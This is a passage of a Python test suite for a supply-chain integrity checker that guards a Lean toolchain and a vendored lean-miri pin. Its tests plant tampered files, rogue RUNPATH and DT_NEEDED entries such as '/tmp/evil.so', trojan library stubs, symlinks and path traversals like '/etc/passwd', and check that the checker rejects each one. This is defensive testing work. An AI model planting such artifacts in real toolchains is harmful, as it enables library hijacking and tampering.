        with mock.patch.object(CT.os, "getuid", return_value=os.getuid() + 1):
            with self.assertRaises(CT.Failure) as cm:
                fast_checker(foreign)
        self.assertIn(f"is owned by uid {os.getuid()}, not by the current user", str(cm.exception))
        # A planted group-writable compiled inspector in a private cache is not reused.
        prefix = self.tmp / "fake-prefix"
        (prefix / "bin").mkdir(parents=True)
        (prefix / "bin" / "leanc").write_text("#!/bin/sh\nexit 0\n")
        checker.lean = prefix / "bin" / "lean"
        checker.expected_lean_sha = CT.LOCKED_LEAN_RELEASE["files"]["bin/lean"]
        checker.inspector_hash = "1" * 64
        checker.inspector = self.tmp / "TrustedBoundary.lean"
        bin_key = CT.fingerprint({"schema": 1, "toolchain": CT.TOOLCHAIN, "leanSha256": checker.expected_lean_sha,
                                  "leancSha256": CT.digest(prefix / "bin" / "leanc"), "inspectorSha256": checker.inspector_hash})
        planted = fresh / "inspector-bin" / f"TrustedBoundary-{bin_key}"
        planted.parent.mkdir()
        planted.write_text("#!/bin/sh\nexit 0\n")
        os.chmod(planted, 0o775)
        self.assertEqual(CT._private_cache_problem(planted, leaf=True), "is group- or world-writable")
        failed = subprocess.CompletedProcess(args=[], returncode=1)
        with mock.patch.object(CT.subprocess, "run", return_value=failed) as run:
            self.assertIsNone(checker._get_compiled_inspector())
        self.assertEqual(run.call_args_list[0].args[0][:2], [str(checker.lean), "-c"])  # recompiles; never runs `planted`
        os.chmod(planted, 0o755)
        self.assertEqual(checker._get_compiled_inspector(), planted)  # private, owner-only-writable entry is reused

    def test_unsafe_lean_executable_and_symlinked_bin_rejected_before_execution(self) -> None:
        root = make_check_trusted_fixture(self.tmp)
        prefix = self.tmp / "unsafe"
        (prefix / "bin").mkdir(parents=True)
        lean = prefix / "bin" / "lean"
        lean.write_text("#!/bin/sh\nexit 0\n")
        with self.subTest("world-writable"):
            os.chmod(lean, 0o757)
            self.assertRejectedBeforeExecution(self.checker(root, lean), 2, "toolchain", "it is world-writable")
        with self.subTest("symlinked bin/ directory"):
            os.chmod(lean, 0o755)
            real = self.tmp / "real-bin"
            shutil.move(str(prefix / "bin"), str(real))
            os.symlink(real, prefix / "bin")
            self.assertRejectedBeforeExecution(self.checker(root, prefix / "bin" / "lean"), 2, "toolchain", "is a symlink or not a directory")
        with self.subTest("symlinked bin/lean leaf"):
            link_prefix = self.tmp / "link-prefix"
            (link_prefix / "bin").mkdir(parents=True)
            os.symlink(real / "lean", link_prefix / "bin" / "lean")
            self.assertRejectedBeforeExecution(self.checker(root, link_prefix / "bin" / "lean"), 1, "toolchain", "expected a regular file")

    def test_check_trusted_runpath_semantics_on_a_synthetic_release(self) -> None:
        prefix = self.tmp / "synthetic-release"
        (prefix / "bin").mkdir(parents=True)
        (prefix / "lib" / "lean").mkdir(parents=True)

        def install(bin_lean: bytes, extra: Optional[Dict[str, bytes]] = None) -> Dict[str, Any]:
            images = {
                "bin/lean": bin_lean,
                "bin/lake": make_elf64(["libleanshared.so", "libc.so.6"], ["$ORIGIN/../lib", "$ORIGIN/../lib/lean"]),
                "lib/lean/libleanshared.so": make_elf64(["libc.so.6"], ["$ORIGIN/..", "$ORIGIN"]),
            }
            images.update(extra or {})
            for rel, data in images.items():
                (prefix / rel).write_bytes(data)
                os.chmod(prefix / rel, 0o755 if rel.startswith("bin/") else 0o644)
            return {"files": {rel: _sha256(data) for rel, data in images.items()}}

        release = install(make_elf64(["libleanshared.so", "libc.so.6"], ["$ORIGIN/../lib", "${ORIGIN}/../lib/lean"]))
        self.assertEqual(CT.lean_release_findings(prefix, release), [])  # clean control
        outside = self.tmp / "evil-lib"
        outside.mkdir()
        (prefix / "lib" / "libz.so.1").write_bytes(b"\x7fELF-trojan-zlib")
        cases = (
            (["libleanshared.so"], [str(outside)], f"bin/lean: DT_RUNPATH entry {str(outside)!r} resolves outside the toolchain root"),
            (["libleanshared.so"], ["$ORIGIN/../.."], "bin/lean: DT_RUNPATH entry '$ORIGIN/../..' resolves outside the toolchain root"),
            (["libleanshared.so"], ["$ORIGIN/.."], "bin/lean: DT_RUNPATH entry '$ORIGIN/..' resolves outside the toolchain root"),
            (["libleanshared.so"], ["$ORIGIN/../lib/.."], "bin/lean: DT_RUNPATH entry '$ORIGIN/../lib/..' resolves outside the toolchain root"),
            (["libleanshared.so"], [f"$ORIGIN/../../{prefix.name}/lib"], f"bin/lean: DT_RUNPATH entry '$ORIGIN/../../{prefix.name}/lib' resolves outside the toolchain root"),
            (["libleanshared.so"], ["${ORIGIN}/../lib:"], "bin/lean: empty DT_RUNPATH/DT_RPATH component"),
            (["libleanshared.so"], ["$LIB/x"], "bin/lean: unsupported DT_RUNPATH entry '$LIB/x'"),
            (["libleanshared.so"], ["lib/lean"], "bin/lean: unsupported DT_RUNPATH entry 'lib/lean'"),
            (["libleanshared.so"], ["$ORIGIN/../lib/lean", ""], "bin/lean: empty DT_RUNPATH/DT_RPATH component"),
            (["libleanshared.so"], ["$ORIGINX/../lib/lean"], "bin/lean: unsupported DT_RUNPATH entry '$ORIGINX/../lib/lean'"),
            (["libleanshared.so"], ["${ORIGIN/../lib/lean"], "bin/lean: unsupported DT_RUNPATH entry '${ORIGIN/../lib/lean'"),
            (["/tmp/evil.so"], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry '/tmp/evil.so' is a path"),
            (["sub/evil.so"], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry 'sub/evil.so' is a path"),
            ([""], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry '' is a path"),
            (["."], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry '.' is a path"),
            ([".."], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry '..' is a path"),
            (["$ORIGIN/evil.so"], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry '$ORIGIN/evil.so' is a path"),
            (["$ORIGIN"], ["$ORIGIN/../lib/lean"], "bin/lean: DT_NEEDED entry '$ORIGIN' is a path"),
            (["libz.so.1"], ["$ORIGIN/../lib"], "RUNPATH shadowing: bin/lean needs 'libz.so.1', which ld.so can resolve to the unpinned toolchain file lib/libz.so.1"),
        )
        for needed, runpath, needle in cases:
            with self.subTest(needed=needed, runpath=runpath):
                self.assertFindings(CT.lean_release_findings(prefix, install(make_elf64(needed, runpath))), needle, absent=("SHA-256 mismatch",))
        with self.subTest("shadow hidden behind an ignored DT_RPATH"):
            release = install(make_elf64(["libz.so.1"], ["$ORIGIN/../lib"], rpath=["$ORIGIN/../lib/lean"]), {"lib/lean/libz.so.1": b"pinned-zlib"})
            self.assertFindings(CT.lean_release_findings(prefix, release), "which ld.so can resolve to the unpinned toolchain file lib/libz.so.1", absent=("lib/lean/libz.so.1,",))
            (prefix / "lib" / "lean" / "libz.so.1").unlink()
        with self.subTest("unparseable pinned ELF"):
            release = install(make_elf64(["libleanshared.so"], ["$ORIGIN/../lib/lean"], unterminated=True))
            self.assertFindings(CT.lean_release_findings(prefix, release), "cannot parse the ELF dynamic section of bin/lean: unterminated")
        with self.subTest("digest drift"):
            release = install(make_elf64(["libleanshared.so"], ["$ORIGIN/../lib/lean"]))
            (prefix / "bin" / "lake").write_bytes(b"#!/bin/sh\n")
            self.assertFindings(CT.lean_release_findings(prefix, release), "SHA-256 mismatch for bin/lake")

    def test_digest_memo_never_masks_a_modification(self) -> None:
        path = self.tmp / "memo.bin"
        path.write_bytes(b"A" * 4096)
        st = os.lstat(path)
        first = CT._memo_sha256(path, st)
        path.write_bytes(b"B" * 4096)  # same size, possibly within the same timestamp tick
        self.assertNotEqual(CT._memo_sha256(path, os.lstat(path)), first)
        # Fresh files (mtime/ctime within the settle window) are never memoized.
        self.assertFalse([key for key in CT._DIGEST_MEMO if key[0] == str(path)])

    # -- root manifest -------------------------------------------------------

    def write_root_manifest(self, root: Path, entries: Dict[str, bytes], *, extra: str = "") -> Path:
        lines = ["# Copyright 2026 The Fuchsia Authors", ""]
        for rel, data in entries.items():
            (root / rel).parent.mkdir(parents=True, exist_ok=True)
            (root / rel).write_bytes(data)
            lines.append(f"{_sha256(data)}  {rel}")
        manifest = root / "trusted" / "root-manifest.sha256"
        manifest.write_text("\n".join(lines) + "\n" + extra, encoding="utf-8")
        return manifest

    def test_tampered_root_manifest_entry_rejected_before_tool_admission(self) -> None:
        root = make_check_trusted_fixture(self.tmp)
        self.write_root_manifest(root, {"Cargo.toml": b"[workspace]\n", "lean-miri/UPSTREAM_PIN.json": b"{}\n"})
        summary = CT.verify_root_manifest(root)
        self.assertEqual(summary["coveredFiles"], 2)
        with self.subTest("covered file tampered"):
            (root / "Cargo.toml").write_bytes(b"[workspace]\nmembers = [\"evil\"]\n")
            self.assertRejectedBeforeExecution(self.checker(root, self.tmp / "never" / "bin" / "lean"), 1, "root-manifest", "SHA-256 mismatch for Cargo.toml")
            (root / "Cargo.toml").write_bytes(b"[workspace]\n")
        with self.subTest("manifest entry tampered"):
            manifest = root / "trusted" / "root-manifest.sha256"
            text = manifest.read_text()
            manifest.write_text(text.replace(_sha256(b"[workspace]\n"), "0" * 64))
            self.assertRejectedBeforeExecution(self.checker(root, self.tmp / "never" / "bin" / "lean"), 1, "root-manifest", "SHA-256 mismatch for Cargo.toml: manifest " + "0" * 64)
            manifest.write_text(text)
        self.assertEqual(CT.verify_root_manifest(root), summary)

    def test_malformed_root_manifests_rejected(self) -> None:
        root = make_check_trusted_fixture(self.tmp)
        manifest = self.write_root_manifest(root, {"Cargo.toml": b"[workspace]\n"})
        good = manifest.read_text()
        digest = _sha256(b"[workspace]\n")
        (root / "alias.toml").symlink_to("Cargo.toml")
        (root / "linkdir").symlink_to("trusted", target_is_directory=True)
        cases = (
            ("no entries", "# only comments\n", "contains no checksum entries"),
            ("malformed line", good + "not a checksum line\n", "malformed checksum entry"),
            ("duplicate", good + f"{digest}  Cargo.toml\n", "duplicate covered file Cargo.toml"),
            ("traversal", good + f"{digest}  ../outside\n", "is not canonical"),
            ("absolute", good + f"{digest}  /etc/passwd\n", "is absolute"),
            ("dot component", good + f"{digest}  ./Cargo.toml\n", "is not canonical"),
            ("self-coverage", good + f"{digest}  trusted/root-manifest.sha256\n", "the manifest cannot cover itself"),
            ("missing covered file", good + f"{digest}  missing.file\n", "covered file missing.file is missing or unreadable"),
            ("symlinked covered file", good + f"{digest}  alias.toml\n", "covered file alias.toml is reached through a symlink"),
            ("covered file below a symlinked directory", good + f"{digest}  linkdir/audit/check_trusted.py\n", "is reached through a symlink (linkdir)"),
            ("uppercase digest", f"{digest.upper()}  Cargo.toml\n", "malformed checksum entry"),
        )
        for label, text, needle in cases:
            with self.subTest(label):
                manifest.write_text(text)
                with self.assertRaises(CT.Failure) as cm:
                    CT.verify_root_manifest(root)
                self.assertEqual((cm.exception.code, cm.exception.phase), (1, "root-manifest"))
                self.assertIn(needle, str(cm.exception))
        with self.subTest("manifest itself is a symlink"):
            real = self.tmp / "real-manifest"
            real.write_text(good)
            manifest.unlink()
            manifest.symlink_to(real)
            with self.assertRaises(CT.Failure) as cm:
                CT.verify_root_manifest(root)
            self.assertIn("is reached through a symlink", str(cm.exception))
            manifest.unlink()
        self.assertEqual(CT.verify_root_manifest(root), {})  # absent manifest: test_boundary.py fixtures

    def test_live_root_manifest_covers_the_pin_and_this_verifier(self) -> None:
        text = (REPO_ROOT / "trusted" / "root-manifest.sha256").read_text(encoding="utf-8")
        covered = re.findall(r"^[0-9a-f]{64}  (\S+)$", text, re.M)
        for rel in ("Cargo.toml", "Cargo.lock", "flake.nix", "flake.lock", "lean-miri/UPSTREAM_PIN.json", "scripts/verify_lean_miri_pin.py"):
            self.assertIn(rel, covered)
        self.assertEqual(CT.verify_root_manifest(REPO_ROOT)["coveredFiles"], len(covered))

    # -- lean-miri vendor pin ------------------------------------------------

    def fixture_with_lean_miri(self) -> Tuple[Path, Workspace]:
        root = make_check_trusted_fixture(self.tmp)
        ws = Workspace(root)
        (root / "lean-miri").mkdir()
        shutil.copy2(REPO_ROOT / V.PIN_RELPATH, ws.pin_path)
        shutil.copytree(REPO_ROOT / V.VENDOR_RELPATH, ws.vendor, symlinks=True)
        return root, ws

    def test_live_lean_miri_pin_verified_by_check_trusted(self) -> None:
        summary = CT.verify_lean_miri_pin(REPO_ROOT)
        self.assertEqual((summary["vendorFiles"], summary["auxFiles"], summary["patchedFiles"]), (608, 9, 10))
        self.assertEqual(summary["sha256"], _sha256((REPO_ROOT / V.PIN_RELPATH).read_bytes()))

    @NEEDS_LIVE_RELEASE
    def test_pins_verified_before_tool_admission_and_recorded(self) -> None:
        root, _ = self.fixture_with_lean_miri()
        self.write_root_manifest(root, {"Cargo.lock": b"# lock\n"}, extra=f"{_sha256((root / V.PIN_RELPATH).read_bytes())}  {V.PIN_RELPATH}\n")
        checker = self.checker(root, LIVE_TOOLCHAIN_DIR / "bin" / "lean")
        self.assertEqual(self.run_until_first_lean_process(checker), [("version", ["--version"])])
        self.assertEqual(checker.preflight["rootManifest"]["coveredFiles"], 2)
        self.assertEqual(checker.preflight["leanMiriPin"]["patchedFiles"], 10)

    def test_tampered_vendor_file_and_planted_olean_rejected_before_tool_admission(self) -> None:
        root, ws = self.fixture_with_lean_miri()
        self.assertEqual(CT.verify_lean_miri_pin(root)["vendorFiles"], 608)
        never = self.tmp / "never" / "bin" / "lean"
        call = ws.path("Miri/Interpreter/Call.lean")
        original = call.read_bytes()
        with self.subTest("tampered patched Call.lean"):
            call.write_bytes(original + b"\n-- smuggled\n")
            self.assertRejectedBeforeExecution(self.checker(root, never), 1, "lean-miri-pin", "Miri/Interpreter/Call.lean: on-disk SHA-256", "reviewed Episode 1 patched_sha256")
            call.write_bytes(original)
        with self.subTest("tampered unpatched file"):
            size = ws.path(TAMPER_TARGET).read_bytes()
            ws.path(TAMPER_TARGET).write_bytes(size + b"-- x\n")
            self.assertRejectedBeforeExecution(self.checker(root, never), 1, "lean-miri-pin", f"SHA-256 mismatch for {TAMPER_TARGET}", "git tree SHA-1 mismatch for Miri/")
            ws.path(TAMPER_TARGET).write_bytes(size)
        for rel in ("Miri/Interpreter/Call.olean", "Miri/ABI/Size.olean.private", "Miri.ilean"):
            with self.subTest(f"planted {rel}"):
                ws.path(rel).write_bytes(b"\x00planted")
                self.assertRejectedBeforeExecution(self.checker(root, never), 1, "lean-miri-pin", f"planted build artifact: {rel}")
                ws.path(rel).unlink()
        with self.subTest("planted .lake/ build tree"):
            (ws.vendor / ".lake" / "build").mkdir(parents=True)
            (ws.vendor / ".lake" / "build" / "Miri.olean").write_bytes(b"\x00")
            self.assertRejectedBeforeExecution(self.checker(root, never), 1, "lean-miri-pin", "planted build artifact directory: .lake/")
            shutil.rmtree(ws.vendor / ".lake")
        with self.subTest("hard-linked vendor file"):
            hard_vendor = self.tmp / "hard-Size.lean"
            os.link(ws.path(TAMPER_TARGET), hard_vendor)
            self.assertRejectedBeforeExecution(self.checker(root, never), 1, "lean-miri-pin", f"hard-linked file (st_nlink=2, writable through another path): {TAMPER_TARGET}")
            hard_vendor.unlink()
        self.assertEqual(CT.verify_lean_miri_pin(root)["patchedFiles"], 10)

    def test_lean_miri_pin_policy_violations_rejected(self) -> None:
        root, ws = self.fixture_with_lean_miri()
        pristine = ws.pin_path.read_text(encoding="utf-8")
        rel = "Miri/Interpreter/ExecutionCast.lean"

        def drift(pin: Dict[str, Any]) -> None:
            ws.path(rel).write_bytes(ws.path(rel).read_bytes() + b"\n-- edit\n")
            ws.patched_entry(pin, rel)["patched_sha256"] = _sha256(ws.path(rel).read_bytes())

        cases: List[Tuple[str, Callable[[Dict[str, Any]], None], str]] = [
            ("self-consistent patched digest drift", drift, "!= reviewed Episode 1 patched_sha256"),
            ("dropped patch entry", lambda p: p.update(patched_files=p["patched_files"][1:]), "patched_files is missing the reviewed overlay entry for 'Miri/Interpreter/Call.lean'"),
            ("no patched_files", lambda p: p.pop("patched_files"), "missing key 'patched_files'"),
            ("non-allowlisted patch", lambda p: p["patched_files"].append(dict(p["patched_files"][0], path=TAMPER_TARGET)), f"{TAMPER_TARGET!r} is not in the reviewed 10-file deinitMovedPlace overlay"),
            ("unknown key", lambda p: p.update(execution_machine_closure=[]), "unknown key 'execution_machine_closure'"),
            ("forged commit", lambda p: p.update(commit="f" * 40), "commit 'ffff"),
            ("forged Miri tree", lambda p: p["upstream_git_objects"].update(Miri="0" * 40), "upstream_git_objects"),
            ("forged manifest", lambda p: p["vendor_tree"].update(manifest_sha256="0" * 64), "vendor_tree.manifest_sha256"),
            ("build toolchain drift", lambda p: p.update(build_lean_toolchain="leanprover/lean4:v4.35.0"), "build_lean_toolchain"),
            ("vendor_tree pins patched bytes", lambda p: ws.manifest_entry(p, rel).update(sha256=V.LOCKED_DEINIT_PATCHED_FILES[rel]["patched_sha256"]), f"vendor_tree entry for {rel} must pin the upstream bytes"),
            ("traversal path", lambda p: p["vendor_aux_files"][0].update(path="../escape"), "is not canonical"),
        ]
        never = self.tmp / "never" / "bin" / "lean"
        for label, fn, needle in cases:
            with self.subTest(label):
                saved = ws.path(rel).read_bytes()
                pin = json.loads(pristine)
                fn(pin)
                ws.write_pin(pin)
                self.assertRejectedBeforeExecution(self.checker(root, never), 1, "lean-miri-pin", needle)
                ws.pin_path.write_text(pristine, encoding="utf-8")
                ws.path(rel).write_bytes(saved)
        with self.subTest("duplicate JSON key"):
            ws.pin_path.write_text(pristine.replace('"schema_version": 2,', '"schema_version": 2, "schema_version": 2,', 1), encoding="utf-8")
            self.assertRejectedBeforeExecution(self.checker(root, never), 1, "lean-miri-pin", "duplicate JSON object key 'schema_version'")
            ws.pin_path.write_text(pristine, encoding="utf-8")
        with self.subTest("symlinked vendor file"):
            outside = self.tmp / "outside-Size.lean"
            shutil.copy2(ws.path(TAMPER_TARGET), outside)
            ws.path(TAMPER_TARGET).unlink()
            os.symlink(outside, ws.path(TAMPER_TARGET))
            self.assertRejectedBeforeExecution(self.checker(root, never), 1, "lean-miri-pin", f"symlink forbidden (file symlink): {TAMPER_TARGET}")
            ws.path(TAMPER_TARGET).unlink()
            shutil.copy2(outside, ws.path(TAMPER_TARGET))
        with self.subTest("unlisted vendor file and extraneous directory"):
            ws.path("Miri/ABI/Rogue.lean").write_bytes(b"-- rogue\n")
            ws.path("Miri/Empty").mkdir()
            error = self.assertRejectedBeforeExecution(self.checker(root, never), 1, "lean-miri-pin", "unlisted .lean file (not in the pin): Miri/ABI/Rogue.lean")
            self.assertIn("extraneous directory (contains no pinned file): Miri/Empty/", str(error))
            ws.path("Miri/ABI/Rogue.lean").unlink()
            ws.path("Miri/Empty").rmdir()
        with self.subTest("vendor present but pin deleted"):
            ws.pin_path.unlink()
            self.assertRejectedBeforeExecution(self.checker(root, never), 1, "lean-miri-pin", "lean-miri/UPSTREAM_PIN.json is missing or unreadable")
            ws.pin_path.write_text(pristine, encoding="utf-8")
        with self.subTest("pin replaced by a dangling symlink"):
            ws.pin_path.unlink()
            os.symlink(self.tmp / "nowhere.json", ws.pin_path)
            self.assertRejectedBeforeExecution(self.checker(root, never), 1, "lean-miri-pin", "is reached through a symlink")
            ws.pin_path.unlink()
            ws.pin_path.write_text(pristine, encoding="utf-8")
        self.assertEqual(CT.verify_lean_miri_pin(root)["patchedFiles"], 10)

    @NEEDS_LIVE_RELEASE
    def test_freshness_revalidates_root_manifest_lean_miri_pin_and_tool_hashes_mid_run(self) -> None:
        """`Checker.freshness()` must detect mid-run modifications, deletions, or
        symlink replacements of `trusted/root-manifest.sha256` (and its covered
        files), `lean-miri/UPSTREAM_PIN.json` (and `lean-miri/vendor/`), and
        `Cargo.toml`, as well as mid-run planting of a manifest or pin."""
        root, ws = self.fixture_with_lean_miri()
        pin_bytes = ws.pin_path.read_bytes()
        manifest = self.write_root_manifest(
            root,
            {"Cargo.lock": b"# lock\n"},
            extra=f"{_sha256(pin_bytes)}  {V.PIN_RELPATH}\n",
        )
        manifest_bytes = manifest.read_bytes()
        size_path = ws.path(TAMPER_TARGET)
        size_bytes = size_path.read_bytes()
        checker = self.checker(root, LIVE_TOOLCHAIN_DIR / "bin" / "lean")
        self.assertEqual(self.run_until_first_lean_process(checker), [("version", ["--version"])])
        self.assertIn(CT.ROOT_MANIFEST_RELPATH, checker.tool_hashes)
        self.assertIn(CT.LEAN_MIRI_PIN_RELPATH, checker.tool_hashes)
        checker.freshness()  # baseline clean

        def assert_freshness_fails(needle: str) -> None:
            with self.assertRaises(CT.Failure) as cm:
                checker.freshness()
            self.assertEqual((cm.exception.code, cm.exception.phase), (2, "freshness"), str(cm.exception))
            self.assertIn(needle, str(cm.exception))

        with self.subTest("root-manifest modified mid-run"):
            manifest.write_bytes(manifest_bytes + b"# comment\n")
            assert_freshness_fails("checker/policy inputs changed during check")
            manifest.write_bytes(manifest_bytes)
        with self.subTest("file covered by root-manifest modified mid-run"):
            (root / "Cargo.lock").write_bytes(b"# tampered mid-run\n")
            assert_freshness_fails("SHA-256 mismatch for Cargo.lock")
            (root / "Cargo.lock").write_bytes(b"# lock\n")
        with self.subTest("UPSTREAM_PIN.json modified mid-run"):
            ws.pin_path.write_bytes(pin_bytes + b"\n")
            assert_freshness_fails("checker/policy inputs changed during check")
            ws.pin_path.write_bytes(pin_bytes)
        with self.subTest("UPSTREAM_PIN.json replaced by symlink to identical bytes mid-run"):
            outside_pin = self.tmp / "outside-pin.json"
            outside_pin.write_bytes(pin_bytes)
            ws.pin_path.unlink()
            ws.pin_path.symlink_to(outside_pin)
            assert_freshness_fails("expected a regular file")
            ws.pin_path.unlink()
            ws.pin_path.write_bytes(pin_bytes)
        with self.subTest("vendored Miri file modified mid-run"):
            size_path.write_bytes(size_bytes + b"\n-- mid-run tamper\n")
            assert_freshness_fails(f"SHA-256 mismatch for {TAMPER_TARGET}")
            size_path.write_bytes(size_bytes)
        with self.subTest("Cargo.toml planted mid-run when absent at admission"):
            (root / "Cargo.toml").write_bytes(b"[workspace]\n")
            assert_freshness_fails("checker/policy inputs changed during check")
            (root / "Cargo.toml").unlink()
        checker.freshness()  # restored state passes again


# ---------------------------------------------------------------------------
# Lean hygiene
# ---------------------------------------------------------------------------

#: Keywords that must not occur in Lean code (comments/strings stripped).
LEAN_FORBIDDEN_KEYWORDS = ("sorry", "admit", "native_decide", "axiom", "unsafe", "partial", "implemented_by", "extern")
#: Names that smuggle in unchecked trust even when qualified (`Lean.ofReduceBool`).
LEAN_FORBIDDEN_NAMES = ("ofReduceBool", "reduceBool", "trustCompiler", "skipKernelTC", "sorryAx", "admitGoal", "mkSorry", "addDecl", "axiomDecl")
#: Lean's standard axioms; everything else (`sorryAx`, `Lean.ofReduceBool`,
#: `Lean.trustCompiler`, custom axioms) is rejected.
ALLOWED_AXIOMS = frozenset({"propext", "Quot.sound", "Classical.choice"})
_LEAN_ID = "A-Za-z0-9_'!?"
_GUARD_PRINT_RE = re.compile(r"#guard_msgs(?:\s*\(([^)]*)\))?\s+in\s+#print\s+axioms\s+(\S+)")
_PRINT_AXIOMS_RE = re.compile(r"#print\s+axioms\s+(\S+)")
#: Lean name literals (`` `Foo.bar `` and ``` ``Foo.bar ```) quote a name; they are
#: not uses of the constant (e.g. an axiom audit comparing against ``sorryAx).
_LEAN_NAME_LITERAL_RE = re.compile(r"``?[A-Za-z_\u00C0-\uFFFF][A-Za-z0-9_'!?.\u00C0-\uFFFF]*")
_SELF_AUDIT_ELAB_RE = re.compile(r'^elab\s+"(#assert_[A-Za-z0-9_]*axioms)"\s*:\s*command\s*=>', re.M)

LEAN_HYGIENE_REQUIRED = ("lean-miri/lean/LeanMiriSpec/Correspondence/MoveDeinitEquiv.lean",)
#: Shard 1 (`ep2-A0-shard1`) promotes the correspondence codec here; checked when present.
LEAN_HYGIENE_OPTIONAL_GLOBS = ("trusted/lean/Trusted/Correspondence.lean", "theory/Anneal/Mir/Correspondence/**/*.lean")


def lean_hygiene_targets() -> List[str]:
    targets = [rel for rel in LEAN_HYGIENE_REQUIRED]
    for pattern in LEAN_HYGIENE_OPTIONAL_GLOBS:
        for path in sorted(REPO_ROOT.glob(pattern)):
            rel = path.relative_to(REPO_ROOT).as_posix()
            if path.is_file() and rel not in targets:
                targets.append(rel)
    return targets


def strip_lean_comments_and_strings(src: str) -> str:
    """Blank out comments (nested `/- -/`, `--`), string and char literals,
    preserving length and newlines so offsets and line numbers survive."""

    def blank(segment: str) -> str:
        return "".join("\n" if ch == "\n" else " " for ch in segment)

    out: List[str] = []
    i, n = 0, len(src)
    while i < n:
        if src.startswith("--", i):
            j = src.find("\n", i)
            j = n if j < 0 else j
            out.append(blank(src[i:j]))
            i = j
            continue
        if src.startswith("/-", i):
            depth, j = 1, i + 2
            while j < n and depth:
                if src.startswith("/-", j):
                    depth, j = depth + 1, j + 2
                elif src.startswith("-/", j):
                    depth, j = depth - 1, j + 2
                else:
                    j += 1
            if depth:
                raise ValueError(f"unterminated block comment at offset {i}")
            out.append(blank(src[i:j]))
            i = j
            continue
        ch = src[i]
        prev = src[i - 1] if i else ""
        prev_ident = bool(prev) and (prev.isalnum() or prev in "_'!?.")
        if ch == "r" and not prev_ident:
            m = re.match(r'r(#*)"', src[i:])
            if m:
                end = src.find('"' + m.group(1), i + len(m.group(0)))
                if end < 0:
                    raise ValueError(f"unterminated raw string at offset {i}")
                j = end + 1 + len(m.group(1))
                out.append(blank(src[i:j]))
                i = j
                continue
        if ch == '"':
            j = i + 1
            while j < n and src[j] != '"':
                j += 2 if src[j] == "\\" else 1
            if j >= n:
                raise ValueError(f"unterminated string literal at offset {i}")
            out.append(blank(src[i : j + 1]))
            i = j + 1
            continue
        if ch == "'" and not prev_ident:
            m = re.match(r"'(?:\\(?:u\{[0-9A-Fa-f]+\}|x[0-9A-Fa-f]{2}|.)|[^\\'\n])'", src[i:])
            if m:
                out.append(blank(m.group(0)))
                i += len(m.group(0))
                continue
        out.append(ch)
        i += 1
    return "".join(out)


def strip_lean_name_literals(code: str) -> str:
    return _LEAN_NAME_LITERAL_RE.sub(lambda m: " " * len(m.group(0)), code)


def find_forbidden_lean_tokens(code: str) -> List[Tuple[int, str]]:
    hits = []
    for token in LEAN_FORBIDDEN_KEYWORDS:
        for m in re.finditer(rf"(?<![{_LEAN_ID}.]){re.escape(token)}(?![{_LEAN_ID}])", code):
            hits.append((code.count("\n", 0, m.start()) + 1, token))
    for token in LEAN_FORBIDDEN_NAMES:
        for m in re.finditer(rf"(?<![{_LEAN_ID}]){re.escape(token)}(?![{_LEAN_ID}])", code):
            hits.append((code.count("\n", 0, m.start()) + 1, token))
    return sorted(hits)


def parse_axiom_guards(src: str) -> Tuple[List[Dict[str, Any]], List[str]]:
    """Return (`#guard_msgs in #print axioms` pairs, problems)."""
    code = strip_lean_comments_and_strings(src)
    guards: List[Dict[str, Any]] = []
    problems: List[str] = []
    for m in _GUARD_PRINT_RE.finditer(code):
        spec, target, line = m.group(1) or "", m.group(2), code.count("\n", 0, m.start()) + 1
        if "drop" in spec:
            problems.append(f"line {line}: `#guard_msgs ({spec})` drops messages, so it cannot pin the axioms of {target}")
        before = src[: m.start()].rstrip()
        doc = None
        if before.endswith("-/"):
            start = before.rfind("/--")
            if start >= 0:
                doc = " ".join(before[start + 3 : -2].split())
        guard = {"target": target, "line": line, "doc": doc, "axioms": None}
        guards.append(guard)
        if doc is None:
            problems.append(f"line {line}: #guard_msgs for {target} has no expected-output docstring")
            continue
        dm = re.fullmatch(r"info: '?([^']+?)'? (?:depends on axioms: \[([^\]]*)\]|does not depend on any axioms)", doc)
        if dm is None:
            problems.append(f"line {line}: unrecognized #print axioms expectation for {target}: {doc!r}")
            continue
        printed = dm.group(1)
        if not (printed == target or printed.endswith("." + target) or target.endswith("." + printed)):
            problems.append(f"line {line}: guard expects axioms of {printed!r} but prints {target!r}")
        axioms = [a.strip() for a in (dm.group(2) or "").split(",") if a.strip()]
        guard["axioms"] = axioms
        extra = sorted(set(axioms) - ALLOWED_AXIOMS)
        if extra:
            problems.append(f"line {line}: {target} depends on axioms outside {sorted(ALLOWED_AXIOMS)}: {extra}")
    unguarded = len(_PRINT_AXIOMS_RE.findall(code)) - len(guards)
    if unguarded:
        problems.append(f"{unguarded} `#print axioms` command(s) are not pinned by `#guard_msgs in`")
    return guards, problems


def parse_self_axiom_audits(src: str) -> Tuple[List[str], List[str]]:
    """`elab "#assert_..._axioms" : command` audits that are defined AND invoked,
    each rejecting `sorryAx` / `Lean.ofReduceBool` / `Lean.trustCompiler` and
    admitting no axiom beyond `propext` / `Quot.sound` / `Classical.choice`."""
    code = strip_lean_comments_and_strings(src)
    audits: List[str] = []
    problems: List[str] = []
    # The command name is a string literal (blanked in `code`): match the raw
    # source, keeping only matches whose `elab` keyword is code.
    for m in _SELF_AUDIT_ELAB_RE.finditer(src):
        if code[m.start(): m.start() + 4] != "elab":
            continue
        command = m.group(1)
        invocation = re.search(rf"^{re.escape(command)}\s*$", code[m.end():], re.M)
        body = code[m.end(): m.end() + invocation.start()] if invocation else code[m.end():]
        if invocation is None:
            problems.append(f"{command} is defined but never invoked")
        for forbidden in ("``sorryAx", "`Lean.ofReduceBool", "`Lean.trustCompiler"):
            if forbidden not in body:
                problems.append(f"{command} does not reject {forbidden.lstrip('`')}")
        admitted = set(re.findall(r"a == ``([A-Za-z_.]+)", body)) - {"sorryAx"}
        if not admitted or not admitted <= ALLOWED_AXIOMS:
            problems.append(f"{command} admits {sorted(admitted)} (allowed: {sorted(ALLOWED_AXIOMS)})")
        if "collectAxioms" not in body or "throwError" not in body:
            problems.append(f"{command} does not collectAxioms / throwError")
        audits.append(command)
    return audits, problems


class LeanHygieneScannerSelfTests(unittest.TestCase):
    """Non-vacuity: the scanners must flag planted violations."""

